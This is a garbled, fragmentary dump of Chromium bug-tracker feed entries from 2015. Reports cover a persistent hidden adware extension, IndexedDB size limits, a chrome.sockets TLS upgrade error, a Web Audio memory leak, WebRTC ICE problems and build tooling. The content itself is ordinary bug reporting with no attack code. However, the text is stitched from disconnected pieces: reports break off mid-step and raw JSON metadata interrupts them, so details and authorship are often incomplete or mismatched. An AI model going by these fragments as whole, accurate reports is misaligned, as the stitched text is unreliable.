Boot computer from power off, or completely close and then re-start Chrome.\r\n2. Check Chrome Task Manager for loaded extensions, find &quot;AdsAlert&quot; loaded.\r\n3. Check chrome://extensions, find no corresponding extension.\r\n\r\nWhat is the expected behavior?\r\n\r\nWhat went wrong?\r\nI'm unsure of where this extension came from or how it continues to manifest itself. Between a few weeks and a month or so ago I found some malware on my desktop, which was injecting banner ads and pop up ads in various web pages. I checked chrome://extensions and found two extensions which I had not installed. I deleted them. I then checked the Windows Program &amp; Features menu and found 3 programs installed the day prior, which I had not installed. I removed those using that menu as well. I then used Malware Bytes, Spybot S&amp;D, and Windows Defender, to remove any remaining infected files/registry keys/etc. Since, I have scanned all my hard disks multiple times and am consistently returned reports of my system being free of infections.\r\n\r\nHowever, I was still getting the occasional pop-up ad. It would only happen when I would click an intentional pop-up (i.e. &quot;Pop Out Chat&quot; in G:Chat, or opening links in a new tab).\r\n\r\nI've checked the extension ID of every folder in my &quot;extensions/&quot; directory, and none of them are malicious/not supposed to be there. The only way I'm able to find the extension is by opening the Chrome Task Manager, where it appears.\r\n\r\nThe extension's name is &quot;AdsAlert&quot;. I seeked help in the #Chromium-Support IRC channel, and after some initial troubleshooting, we were unable to mitigate the issue. Solutions we attempted included checking the &quot;Sync Node Browser &gt; Extensions&quot; tab of chrome://sync-internals to ensure that the extension did not appear there, which it did not. We also checked my full command line of the PID which the extension was appearing under, which I was told appeared to be normal (Link to pastebin below). It was suggested then that I file a bug report as an extension which was continually reloading itself while not showing up under &quot;chrome://extensions&quot; could be considered a bug.\r\n\r\nCurrently, I'm able to work around it by opening the Chrome Task Manager and killing the extension that way once I initially launch Chrome. After doing this, the extension does not reload itself unless I completely close and then re-open Chrome, or reboot. I'd love to get this thing off my computer, though.\r\n\r\nThanks for all your help in advance.\r\n\r\nWebStore page: \r\n\r\nDid this work before?

Try to add several large objects (videos) to IndexedDB, so that the total size exceeds ~500MB.\r\n\r\nTo do this you can use the attached test script.\r\n\r\n - Upload the &quot;largeVideoFileTest&quot; folder to one of your webservers.\r\n\r\n - Adjust the &quot;url&quot; variable to point to a MP4-Video file.\r\n\r\n - Load the &quot;largeVideoFileTest.html&quot; in your browser.\r\n\r\n - Start the test.\r\n\r\nWhat is the expected behavior?\r\nIt should be possible to store as much blobs in IndexedDB as space or an existing quota allows. And when this limit is reached, an exception should be thrown, to be able to handle it.\r\n\r\nWhat went wrong?\r\nOn the desktop, Google Chrome will just stop storing the video. In the system monitor I can see that the CPU usage goes down at some point and nothing more happens in the browser. \r\n\r\nOn Android (Google Nexus 10) the browser just crash at some point.\r\n\r\nDid this work before? No \r\n\r\nChrome version: 41.0.2272.89  Channel: stable\r\nOS Version: Linux Mint 17 Qiana\r\nFlash Version: Shockwave Flash 17.0 r0\r\n\r\nAttached you'll find a test script which downloads a specified video (MP4) file, adds it several times (configured in variable &quot;numberOfFilesToSave&quot;) to IndexedDB and then creates a link to be able to play it. Everything works fine until a certain point is reached.\r\nI've tested with the following video file sizes:\r\n -  45MB (stops while trying to store video 12)\r\n - 118MB (stops while trying to store video 5)\r\n - 208MB (stops while trying to store video 3)\r\n - 297MB (stops while trying to store video 2)\r\n\r\nCalculating the according stored blob sizes, I get the following results:\r\n\r\n45166147 * 11 = 496827617 --&gt; ((496827617/1024)/1024) = 473,81MB\r\n\r\n117681553 * 4 = 470726212 --&gt; ((470726212/1024)/1024) = 448,92MB\r\n\r\n208046611 * 2 = 416093222 --&gt; ((416093222/1024)/1024) = 396,82MB\r\n\r\n                297849549 --&gt; ((297849549/1024)/1024) = 284,05MB\r\n\r\nFor each result, the 500MB will be exceeded while the next video is stored. So it seems, that there exists a limit and when this is reached, trying to store any more data just won't work.\r\n\r\nWhen the test ran into the problem and I reload the page to start the test again, it sometimes just even store the first video then. In that case I have to close the tab, open the test script in a new tab and the test runs fine again.\r\n\r\nI'm not sure if this problem has anything to do with the fixed issue 399323.\r\nI've also seen https://code.google.com/p/chromium/issues/detail?id=375297, but I think this problem is IndexedDB related, because the Blob creation in the test script (line 168) works fine. After the put-method was called, the transaction &quot;oncomplete&quot;-Handler is never invoked, as is the same for the transaction &quot;onerror&quot;-Handler.\r\n\r\nWhen changing the variable &quot;useLocalforage&quot; to &quot;true&quot;, you can switch between localforage or plain IndexedDB-API (default) usage.\r\n\r\nRegards\r\nKai\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/467886/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=467886"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/467886"}],"author":[{"name":{"$t":"k...@gmx.net"},"uri":{"$t":"/u/116136658256715500958/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/105874814246226490066/"},"issues$username":{"$t":"dmu...@chromium.org"}}],"issues$closedDate":{"$t":"2015-03-17T22:37:21.000Z"},"issues$id":{"$t":467886},"issues$label":[{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Linux"},{"$t":"Cr-Blink-Storage-IndexedDB"}],"issues$mergedInto":{"issues$id":{"$t":375297},"issues$project":{"$t":"chromium"}},"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Duplicate"}},{"gd$etag":"W/\"A0EGR347eCl7ImA9XRRbEEs.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/467885"},"published":{"$t":"2015-03-17T11:20:17.000Z"},"updated":{"$t":"2015-04-03T14:00:26.000Z"},"title":{"$t":"Starred and history icons disappeared from new tab page"},"content":{"$t":"Steps to reproduce the problem:\r\n1.

problem:\r\nIt reproduces locally on it's own but I do not know how to reproduce it on demand.\r\n\r\nI have 2 chrome windows, one logged in with a corporate account and one with a personal one.

None of the UI elements in that tab work but I can still close it with ctrl-w (or right click on the tab header and select to close it). After ctrl-w and ctrl-t to restore the tab, it works fine again for some time.\r\n\r\nThis does not affect any of the other tabs in the same window, but strangely enough, the other chrome window is completely frozen when the calendar tab is frozen - even the tabs can't be switched. When I &quot;HUP&quot; the calendar tab in my &quot;corporate window&quot;, the &quot;personal window&quot; unfreezes and starts working again.\r\n\r\nI'm happy to collect more data if there is something I can run when this happens the next time.\r\n\r\nWhat is the expected behavior?\r\nNothing freezes.\r\n\r\nWhat went wrong?\r\nA tab freezes and takes all the tabs in a different window along for the ride.\r\n\r\nDid this work before?

This could be confusing for extension developers that use Dev channel thinking that their feature works, when its behaviour will change when run on a stable/beta browser.\r\n\r\nI think there are too many bugs for panels to go to stable in their current form, and the documentation should be updated to make that clear.\r\n\r\nI suggest:\r\n a) Rename --enable-panels to --enable-panels-deprecated [or just delete it]\r\n b) Remove selection based on Dev/Canary channels. i.e. only support enable-panels-deprecated (and the whitelist)\r\n c) Update documentation.

Recently, Google announced that they're now auto converting all Flash ads to HTML5, presumably with Swiffy, but it seems like their own browser takes a huge hit any time it sees them.\r\n\r\nThe animations themselves are very choppy. We're talking about 2fps.\r\n\r\nThe browser jank increases 1000%. I tried pausing the Chrome debugger attached to a mobile device via USB debugging and caught Swiffy code using touchstart and touchend, which are known for causing performance issues.\r\n\r\nAny time a page loads without animated ads, the performance is fine.\r\n\r\nWe even tried to apply translateZ(0) to try to force ads to go to the GPU, but don't seem to have much success there.\r\n\r\nAny ideas for optimizations that could force ad rendering on the GPU or help otherwise?\r\n\r\nDid this work before?

If i refresh the same tab, i am still seeing the issue.  \r\n\r\nThe feedback report can be found at:\r\nhttps://feedback.corp.google.com/product/208/neutron?lView=rd&amp;lRSort=1&amp;lROrder=2&amp;lRFilter=1&amp;lReportSearch=user:selavazhagan&amp;lReport=5006515093","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/467708/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=467708"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/467708"}],"author":[{"name":{"$t":"selavazh...@chromium.org"},"uri":{"$t":"/u/104408311633847556322/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/tnakamura@chromium.org/"},"issues$username":{"$t":"tnakamura@chromium.org"}},{"issues$uri":{"$t":"/u/110720167459478556881/"},"issues$username":{"$t":"rohi...@chromium.org"}},{"issues$uri":{"$t":"/u/110216954025425092469/"},"issues$username":{"$t":"avkodipe...@chromium.org"}},{"issues$uri":{"$t":"/u/jansson@chromium.org/"},"issues$username":{"$t":"jansson@chromium.org"}},{"issues$uri":{"$t":"/u/102688543541225303947/"},"issues$username":{"$t":"i...@chromium.org"}},{"issues$uri":{"$t":"/u/marcheu@chromium.org/"},"issues$username":{"$t":"marcheu@chromium.org"}}],"issues$closedDate":{"$t":"2015-03-23T18:09:53.000Z"},"issues$id":{"$t":467708},"issues$label":[{"$t":"Type-Bug-Regression"},{"$t":"Pri-1"},{"$t":"OS-Chrome"},{"$t":"freon"},{"$t":"Cr-OS-Kernel-Video"},{"$t":"M-42"},{"$t":"ReleaseBlock-Beta"},{"$t":"Cr-OS-Kernel-Graphics"}],"issues$mergedInto":{"issues$id":{"$t":462785},"issues$project":{"$t":"chromium"}},"issues$owner":{"issues$uri":{"$t":"/u/posciak@chromium.org/"},"issues$username":{"$t":"posciak@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Duplicate"}},{"gd$etag":"W/\"C04MRH47eCl7ImA9XRRVFks.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/467707"},"published":{"$t":"2015-03-16T21:28:44.000Z"},"updated":{"$t":"2015-03-18T06:59:45.000Z"},"title":{"$t":"After IndexedDB version update, database Open or first query becomes extremely slow."},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.74 Safari/537.36 OPR/28.0.1750.36 (Edition beta)\r\n\r\nSteps to reproduce the problem:\r\n1.

All other modern browsers do the expected thing: they buffer some of the audio for each player, and eventually send a canplay event, and all the players are readyState == 4.\r\n\r\nWhat went wrong?\r\nChrome/chromium sends canplay for the first six audio players, and buffers some proportion of their audio, and then waits forever, starving the other 14. You can verify in the Network tab of the dev tools that it only buffers six of the files. I don't know if play()'ing the other players would trigger them to start buffering, but it's unacceptable behavior if the developer wants the page to wait until enough audio has buffered to begin playback of the files. (My application requires all the audio be ready to play on-demand with no delay, so I'm waiting until the players are loaded to enable the buttons, etc.)\r\n\r\nPresumably, based on info in these bugs:\r\n\r\nhttps://code.google.com/p/chromium/issues/detail?id=162627\r\nhttps://code.google.com/p/chromium/issues/detail?id=158245\r\n\r\n...this is related to the max connections per server being 6. Regardless, it seems like this needs to get fixed: an (understandably) limited number of server connections should not result in network freezing when instantiating more than 6 audio players. It seems like the &quot;6&quot; limit should be more transparent to the web app layer. According to those other bugs, Firefox has the same limit of 6, but handles the situation correctly, so maybe there are some leads there as to a fix.\r\n\r\nThanks for any attention to this!\r\n\r\nDid this work before?

However the new secure API is failing with error code -4 (ERR_INVALID_ARGUMENT) due to the socket currently reading data.\r\n\r\nTo replicate, try this JavaScript:\r\nchrome.sockets.tcp.create({}, function (createInfo) {\r\n  var socketId = createInfo.socketId;\r\n  chrome.sockets.tcp.connect(socketId, 'www.google.com', 443, function (connectResult) {\r\n    if (connectResult !== 0) {\r\n      return;\r\n    }\r\n    chrome.sockets.tcp.setPaused(socketId, true, function(pauseResult) {\r\n      chrome.sockets.tcp.secure(socketId, {}, function(secureResult) {\r\n      });\r\n    });\r\n  });\r\n});\r\n\r\nWhat is the expected behavior?\r\n.secure should successfully change the socket to a TLS connection\r\n\r\nWhat went wrong?\r\nMy understanding of this problem is that when we call .secure, there is currently an outstanding read call (similar to the old chrome.socket.read API), and we are unable to successfully call .secure before this .read call completes.  Even though I am calling chrome.sockets.tcp.setPaused(..., true, ...), it appears that this call doesn't actually stop a read that's in progress, but rather waits for the current read to complete and then no longer calls read again (also described in https://code.google.com/p/chromium/issues/detail?id=360026).  I have made some test projects where I can verify that if I call setPause on an insecure socket, then wait for data to be read on that socket (onReceive is still fired even though setPause was called), then call secure, the call to secure succeeds.  However in some cases we need to upgrade a socket to be secure right away and may not be able to wait for incoming data.\r\n\r\nDid this work before?

Largely this is due to the &quot;wide&quot; API that the sources/consumers implement, where (command) type and parameters are read separately (source) and each segment type has it's own &quot;emitter&quot;. Most (to not say &quot;all&quot;) sources/consumers are mrely translating from one set of parameters to another [1].\r\n\r\nTo improve this, aim to transition to a model/interface where a source/consumer instead read/write a &quot;segment&quot; (i.e a blob of parameters together with a type) at a time, and then let any code that exist &quot;in-between&quot; (normalization, blending) operate on this. This leads to sources/consumers that generally consists of one &quot;big(ger)&quot; method that reads/writes a packet of data from/to whatever storage it represents - instead of many small methods that to some degree need to repeat work (most segments are one or more points and hence pretty homogeneous). This leads to less code, binary and source (~5-600LoC less with current patch-queue). (And the resulting code is slightly faster.) It also simplifies adding new features such as &quot;bearing&quot; (if one would wish to...), &quot;bezierize&quot; and &quot;semi-normalize&quot; (arc to skia-arc).

leak in browser when using web audio API context.createBuffer repeatedly"},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\r\n\r\nExample URL:\r\nNo URL but have a sample page.\r\n\r\nSteps to reproduce the problem:\r\n1. Run the sample page in Chrome. This is based from MDN web audio sample.\r\n2. Click Start to play the audio. (mute the speakers as it is just background noise). \r\n3. Click stop after a minute or two. If memory got reclaimed try again same steps.\r\n\r\nWhat is the expected behavior?\r\nBrowser starts using lot of memory to play the audio data. This is expected as we are not waiting for the data to finish playing back.\r\nHowever even after stopping playback, browser doesn't give the memory back. Chrome dev tools heap snapshot doesn't show any references being held. Using Chrome timeline garbage collect also doesn't free up memory.\r\n\r\nMinimize of browser tab/stop button does reclaim memory some times. But sometimes the memory is never given back. You need to try few times to see the leak.\r\n\r\nNote that running a 2 sec buffer within 50ms loop is not a regular usage of API, but is just used to exhibit the leak quickly.\r\n\r\nWhat went wrong?\r\nIt looks like some references to audiobuffer is being held and is not released always. This could be one of the causes of the bug: https://code.google.com/p/chromium/issues/detail?id=433015\r\n\r\nIt is not specific to context.createBuffer API. The buffer returned by context.decodeAudioData exhibits the same behavior.\r\n\r\nDid this work before? No \r\n\r\nIs it a problem with Flash or HTML5? N/A\r\n\r\nDoes this work in other browsers? N/A \r\n\r\nChrome version: 41.0.2272.76  Channel: stable\r\nOS Version: 6.3\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nWe are currently using the following workaround:\r\nCreate a fixed length buffer(s) at beginning. Reuse buffer(s) during playback. This ensures there is ever only one or few buffers in memory. We needed to ensure that when we overwrite buffer data, it was not currently playing the data so we used couple of them.\r\nIt is also worth noting Firefox implementation did not exhibit huge increase in memory when using this sample page.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/467536/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=467536"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/467536"}],"author":[{"name":{"$t":"santosh....@gmail.com"},"uri":{"$t":"/u/113109693637880619350/"}}],"issues$id":{"$t":467536},"issues$label":[{"$t":"Cr-Blink-WebAudio"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Windows"}],"issues$owner":{"issues$uri":{"$t":"/u/rtoy@chromium.org/"},"issues$username":{"$t":"rtoy@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"C0ACRH47eCl7ImA9XRRVFUs.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/467529"},"published":{"$t":"2015-03-16T13:41:32.000Z"},"updated":{"$t":"2015-03-17T03:09:25.000Z"},"title":{"$t":"gpu_perftests failing on Android One devices"},"content":{"$t":"It seems related to bug 464731, probably an issue with GPU on the devices.

I used download then copy paste images onto documents and this issue never occurred until now.\r\n\r\nChrome version: 41.0.2272.89  Channel: stable\r\nOS Version: 6680.64.0\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nThe last couple ChromeOS updates seem somewhat unstable given the minor (and a few not-so-minor) bugs I have noticed so far.\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/467422/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=467422"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/467422"}],"author":[{"name":{"$t":"dnlper...@gmail.com"},"uri":{"$t":"/u/102037470256889746920/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/101869830235140996189/"},"issues$username":{"$t":"beng...@chromium.org"}},{"issues$uri":{"$t":"/u/115156236124438552252/"},"issues$username":{"$t":"dhadd...@chromium.org"}}],"issues$id":{"$t":467422},"issues$label":[{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Chrome"},{"$t":"Cr-Platform-Apps-FileManager"}],"issues$owner":{"issues$uri":{"$t":"/u/101869830235140996189/"},"issues$username":{"$t":"beng...@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Untriaged"}},{"gd$etag":"W/\"Ak8FSX47eCl7ImA9XRRVGEU.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/467419"},"published":{"$t":"2015-03-15T23:26:38.000Z"},"updated":{"$t":"2015-03-20T22:00:18.000Z"},"title":{"$t":"Impossible to chromecast from pages opened as windows"},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36\r\n\r\nSteps to reproduce the problem:\r\n1. install google cast extension\r\n2. go to chrome://apps/\r\n3. right click an app or page (use youtube for example) and select &quot;open as window&quot;\r\n4. open youtube\r\n5. start playing video\r\n6. select &quot;play on tv&quot;\r\n\r\nWhat is the expected behavior?\r\nA dialogue box pops up somewhere prompting the user to indicate which google cast device to cast the media on.\r\n\r\nWhat went wrong?\r\ndevice selection dialog box normally opens off of google cast icon in chrome toolbar for the window being cast from.

In particular, the following flow is unexpected:\r\n\r\n1. Select &quot;Record Heap Allocations&quot;, click &quot;Start&quot;, then &quot;Stop&quot; recording after some time.\r\n2. Click &quot;Save&quot; on the Heap Timeline that is generated.\r\n3. Return to Profiles, click &quot;Load&quot;, select the saved file.\r\n5. The newly loaded file shows up under Heap Snapshots (instead of Heap Timelines) and the tracing data over time is apparently lost.\r\n\r\nThe difference is fairly minor normally, but with &quot;Record heap allocation stack traces&quot; turned on, the entire allocation stack feature is unavailable in the recalled heapsnapshot file.  The data does appear to be recorded in the file, however.\r\n\r\nI tried this on stable 40.0.2214.115 and beta 42.0.2311.39, both exhibit the same behaviour.\r\n\r\nWhat is the expected behavior?\r\nThe same UI should be presented again after loading from the file, with the small timeline graph and the Allocations drop-down choice still available.\r\n\r\nWhat went wrong?\r\nIt would appear that the heapsnapshot file does indeed contain the call stack/tracing information but isn't loaded into the UI.  It loads into the &quot;Heap Snapshots&quot; section of the UI which is also wrong and probably a big part of the bug.\r\n\r\nIt does seem that at least the timeline information used for the graph is not available in the heapsnapshot file format.  Perhaps an alternate format is needed?\r\n\r\nDid this work before? No \r\n\r\nChrome version: 40.0.2214.111  Channel: n/a\r\nOS Version: \r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nI'm looking at implementing this feature for another tool called Stetho (https://github.com/facebook/stetho as part of issue #92).  It's very useful to be able to instrument code in Stetho using a simple start/stop API that saves to a file that can later be loaded into Chrome DevTools.  However, without the allocation stack traces, the feature is not very useful in practice.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/467222/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=467222"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/467222"}],"author":[{"name":{"$t":"jasta00@gmail.com"},"uri":{"$t":"/u/jasta00@gmail.com/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/102113791455191111245/"},"issues$username":{"$t":"loi...@chromium.org"}},{"issues$uri":{"$t":"/u/113675450667633581299/"},"issues$username":{"$t":"a...@chromium.org"}}],"issues$id":{"$t":467222},"issues$label":[{"$t":"Cr-Platform-DevTools"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Linux"},{"$t":"Cr-Platform-DevTools-Memory"}],"issues$owner":{"issues$uri":{"$t":"/u/yurys@chromium.org/"},"issues$username":{"$t":"yurys@chromium.org"}},"issues$stars":{"$t":3},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"CkQMSH47eCl7ImA9XRRVEkQ.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/467220"},"published":{"$t":"2015-03-13T23:46:29.000Z"},"updated":{"$t":"2015-03-13T23:46:29.000Z"},"title":{"$t":"shill: use WPA supplicant DBus interface to trigger passive scans"},"content":{"$t":"WPA supplicant's DBus interface allows us to choose to perform a passive scan by passing the correct arguments to the &quot;Scan&quot; function.

I was using a page that used about 130mb of memory according to the heap profiler in the javascript dev tools. (Unfortunately I cannot share this page). It uses native drag and drop as a part of its interface.\r\n2. I started dragging over an area that listens for the ondrag event.\r\n\r\nWhat is the expected behavior?\r\nI expected dragging to work fairly quickly\r\n\r\nWhat went wrong?\r\nDragging was very slow. When I profiled this on chrome in the javascript profile, 79.59% of the CPU time was in the (program) process, (which seems to be chrome's own code?). Nothing else besides idle used any significant amount of time.

Unfortunately we have been experiencing issues with ICE connectivity when using recent canary builds of Chrome. The symptoms are that Chrome often selects TCP for sending audio or video media even though a working UDP path exists between the client and the server. In some cases we have even seen chrome use TCP for the RTCP component and UDP for RTP. \r\n\r\nIn the worst case we can end up in the situation where the server believes that connectivity checks have succeeded over UDP (which is the highest priority pair) but Chrome is using TCP to send media to the server; leading to a failure to get DTLS to complete successfully.\r\n\r\nWhat is the expected behavior?\r\n\r\nWhat went wrong?\r\nLooking though a pcap of a failed call it appears that for the first few seconds of the ICE negotiation Chrome is sending STUN binding requests with message integrity values that do not validate using the password sent by the server (causing a 401 Unauthorized response). After a few seconds Chrome begins to send valid connectivity checks, however this corresponds with the time when chrome starts checks over TCP. It's then a race as to whether UDP or TCP ends up being selected for a given component.\r\n\r\nAn example of this behaviour can be seen in the attached pcap file.

Store a PDF file in an extension's persistent FileSystem\r\n2. Try to open a PDF e.g. by: filesystem:chrome-extension://bomfdkbfpdhijjbeoicnfhjbdhncfhig/persistent/7CC819F6A4E011E2B1CA93461E1B95AA/pp_attachments/d1068d47-ef77-09d7-9565-94ba2fa141fc\r\n3. The tab loads Chrome's PDF viewer (background turns gray and inspect elements shows the embedded file). HOwever, the network tab shows status 'Canceled' when the file is being loaded and it is not displayed.\r\n\r\nTo reproduce with our extension, go to https://paperpile.com click 'Start Paperpile' and it will prompt the extension install. Click 'Add Papers &gt; Upload file'  and choose any PDF. It will be stored in the extension filesystem. Click on &quot;View PDF&quot; in the main list of the new item. It will open a new tab with the empty PDF viewer described in step 3.\r\n\r\nWhat is the expected behavior?\r\nChrome's PDF viewer would display the PDF\r\n\r\nWhat went wrong?\r\nThe PDF viewer is loaded so apparently it recognizes the binary file being a PDF but it is not displayed as it cannot be loaded from the extension filesystem. \r\n\r\nWebStore page: https://chrome.google.com/webstore/detail/paperpile-extension/bomfdkbfpdhijjbeoicnfhjbdhncfhig\r\n\r\nDid this work before?

PEP8 serves necessity minimum as a style guide, but after I had terrible experience making changes to src/build, today I feel PEP8 is not sufficient for our project in which Python scripts under src/build are one of the most important key to our productivity. Particularly our Python scripts have very few comments since PEP8 says nothing about it, which makes our code base very difficult to follow.\r\n\r\nThat's why I propose to adopt Google Python style guide and running pylint in commit hook. I expect many good effects to our productivity, notably:\r\n- Docstrings are enforced. Since Python does not have no static typing, documenting what kind of arguments a function expects is crucial to write stable programs in Python.\r\n- Stricter linting. Google Python style guide has many stricter but reasonable style rules than PEP8.

This was done by providing a new implementation in components/crash/app/crashpad_mac.*. The existing Breakpad implementation, components/crash/app/breakpad_mac.* was left behind for the benefit of existing users, which I believe is just content_shell. I’m converting one thing at a time.\r\n\r\nIn order to make this work and not have crashpad_mac and breakpad_mac conflict, I separated the crash_component target in components/crash.gypi into crash_component_base (where most of the goodies are), crash_component, and crash_component_breakpad_mac_to_be_deleted.\r\n\r\ncrash_component depends on crash_component_base and provides the crashpad_mac implementation on Mac.\r\n\r\ncrash_component_breakpad_mac_to_be_deleted depends on crash_component_base and provides the breakpad_mac implementation on Mac.\r\n\r\nThis situation is temporary.

The completion is done more or less by calling {will,did}EnterFullscreen().\r\n\r\nHowever if content/ layer doesn't want to allow fullscreen, then it doesn't send the Resize\r\nmessage and the renderer/ state goes into a inconsistent state, e.g. scrolling using mousewheel\r\ndoesn't work anymore.

This only happens in a handful of existing BUILD.gn files, so it's easily fixed; otherwise, it's not hard to modify the List production rule to allow a trailing nl instead of &quot;,&quot;, and then all existing BUILD.gn files parse.  (My preference is to change the BUILD.gn files and require multiline lists to have a trailing comma.)\r\n\r\n  - The grammar above accepts &quot;x == 3&quot; as a syntactically valid statement, but GN rejects that.

a new audio extension API getDeviceInfo to pass a stable/persisted device id string."},"content":{"$t":"This is a feature request from hotrod app. Hotrod app needs to have a stable device id string to identify the same kind of audio device across the hot plug device reboot. In the current system, chrome receive a device id and device name string from cras and pass them to hotrod. They are not stable across the hot plugs and device reboot. \r\n\r\nIn general, we need to get some support from cras to pass a stable device id string that is stable/persisted across the hot plugs and device reboot. Once we have that, chrome audio extension will add a new API getDeviceInfo to pass this information to the hotrod app.\r\n\r\nFor more details about the stable/persisted device id string discussion. \r\nSee design doc: Design: Stabilize hotrod audio device names.\r\nhttps://docs.google.com/document/d/13ZwCIzpp99kAW5G4wOCj73vjsOE7ce_2DeOSB1MBRmw/edit#heading=h.bvqf18flsh3f\r\n\r\nAnd &quot;Redesign Audio Extension API&quot;\r\nhttps://docs.google.com/document/d/1YFFLwX4mcKJyuAsZB13GhDid0MEt0QguKX0AxgvBoko/edit#heading=h.ng2jd1z39umd\r\n\r\nDiscussion from mnilsson@:\r\nIn fairness, and for the hotrod use case, I think it is less of a problem for audio devices. It's unlikely that the user is going to have multiple identical, say, headsets that can be mixed up. Jabras will be enabled in a group. For video, it's more sensitive that the right camera is selected. But I'm mostly thinking of future proofing the API in general, and having a stable set of identifiers across alsa/chrome versions, so that presented/persisted names don't change. A USB identifier would be great for persisting (hat tip tures) and a sequential number would be acceptable, although there are some gotchas with that too, see some thoughts here: https://docs.google.com/document/d/13ZwCIzpp99kAW5G4wOCj73vjsOE7ce_2DeOSB1MBRmw/edit#heading=h.6opa6gfi9lab","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466768/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466768"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466768"}],"author":[{"name":{"$t":"jen...@chromium.org"},"uri":{"$t":"/u/116571273456147917518/"}}],"issues$blocking":[{"issues$id":{"$t":429312},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/mnils...@chromium.org/"},"issues$username":{"$t":"mnils...@chromium.org"}},{"issues$uri":{"$t":"/u/115170700037126484849/"},"issues$username":{"$t":"dgr...@chromium.org"}},{"issues$uri":{"$t":"/u/116571273456147917518/"},"issues$username":{"$t":"jen...@chromium.org"}},{"issues$uri":{"$t":"/u/113087974153332286582/"},"issues$username":{"$t":"conra...@chromium.org"}}],"issues$id":{"$t":466768},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-1"},{"$t":"Cr-Internals-Media-Audio"},{"$t":"OS-Chrome"},{"$t":"Cr-Platform-Apps"},{"$t":"M-44"},{"$t":"MovedFrom-43"}],"issues$owner":{"issues$uri":{"$t":"/u/103268649670576978488/"},"issues$username":{"$t":"chin...@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"AkMNQ347eCl7ImA9XRRVF0s.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466767"},"published":{"$t":"2015-03-12T20:46:28.000Z"},"updated":{"$t":"2015-03-19T12:34:52.000Z"},"title":{"$t":"Website shown as Mobil on desktop."},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\r\n\r\nExample URL:\r\nhttp://www.adventureparkcostarica.com/en/\r\n\r\nSteps to reproduce the problem:\r\n1. just open the page\r\n2. on all sub pages of this page is the same problem\r\n\r\nWhat is the expected behavior?\r\n\r\nWhat went wrong?\r\ni don't know. i just updated google chrome to the newest update and my page started showing up like the mobile version\r\n\r\nDoes it occur on multiple sites: N/A\r\n\r\nIs it a problem with a plugin?

